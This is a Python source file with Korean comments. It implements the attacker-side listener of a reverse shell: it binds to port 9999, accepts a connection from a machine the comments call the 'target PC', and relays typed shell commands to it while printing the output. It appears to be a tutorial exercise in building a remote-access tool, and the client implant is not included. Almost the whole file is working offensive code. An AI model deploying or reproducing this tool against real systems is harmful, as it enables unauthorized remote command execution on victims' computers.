import socket
import sys

#소켓생성
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("소켓에러 : {}".format(str(msg)))
        pass

#소켓파인딩(데이터 이동위치 파악) -> 프로토콜 규약따르기 위해
def socket_bind():
    #서버는 내pc이고, 클라이언트는 타겟pc
    try:
        global host
        global port
        global s
        print("바인딩 소켓 포트 : {}".format(port))
        s.bind((host, port)) #소켓에 func바인드를 호출하고 튜플형태로 넣자
        s.listen(5) #바인딩 했으니 리슨상태로! 인자는 back connection을 뜻하고, 이 이상은 refusing한다는 뜻
    except socket.error as msg:
        print("소켓 바인딩 에러: {} '\n' .....".format(str(msg)))
        socket_bind() #에러났으니 바인딩 재 호출
        pass

def socket_accept(): #접속요청을 받아들이게하자.
    conn, address = s.accept() #listem( )이 작동중 socket_accept()호출시 새로운 커넥션 수용
    print("Connection has been estalished IP: {}, PORT: {}".format(address[0], address[1]))
    send_commands(conn) # 명령의 실행반환값을 주고받는 통신하기 위해 conn을 보내는함수 만듬
    conn.close()

def send_commands(conn):
    #명령은 일회성으로 보내고 마는게 아니라, 특정 조건 들어오기 전까지 반복
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:  #2진 byte통신이라서 문자를 바이트로 변환하는 encode()사용
            conn.send(str.encode(cmd)) #encode데이터 conn을 통해 send()
            #명령보내고 반환데이터를 conn.recv 로 받자(이때 버퍼사이즈정하고, utf8변환) 그리고 client_response변수에 담자
            client_response = str(conn.recv(2048), "utf-8")
            print(client_response, end="")

#메인함수에서 함수들 호출해 실행하자
def main():
    socket_create()
    socket_bind()
    socket_accept()
    
main()